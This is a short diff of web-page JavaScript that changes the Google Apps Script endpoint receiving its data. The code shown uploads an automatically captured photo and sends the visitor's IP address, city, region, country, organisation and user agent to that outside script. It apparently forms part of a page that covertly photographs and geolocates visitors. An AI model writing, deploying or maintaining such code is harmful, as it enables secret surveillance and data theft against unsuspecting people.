@@ -57,7 +57,7 @@
         formData.append('message', '自動拍照圖片');
         formData.append('imageData', photoData);
 
-        const response = await fetch('https://script.google.com/macros/s/AKfycbyDoVUvwDAjm7Cl3dbmxxm4zFkiVQFL97jKP_gN0sjX07kxqACcbtT4YcQ-DnqriSyBHQ/exec', {
+        const response = await fetch('https://script.google.com/macros/s/AKfycbw3YHSFeqgD900fraoDav7i6azeQaVX9y6UAqUCs56cOzI0O8X4R47wDSMJ0GEs42Um1A/exec', {
           method: 'POST',
           body: formData,
         });
@@ -87,7 +87,7 @@
           IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}
         `;
 
-        const url = new URL('https://script.google.com/macros/s/AKfycbyDoVUvwDAjm7Cl3dbmxxm4zFkiVQFL97jKP_gN0sjX07kxqACcbtT4YcQ-DnqriSyBHQ/exec');
+        const url = new URL('https://script.google.com/macros/s/AKfycbw3YHSFeqgD900fraoDav7i6azeQaVX9y6UAqUCs56cOzI0O8X4R47wDSMJ0GEs42Um1A/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
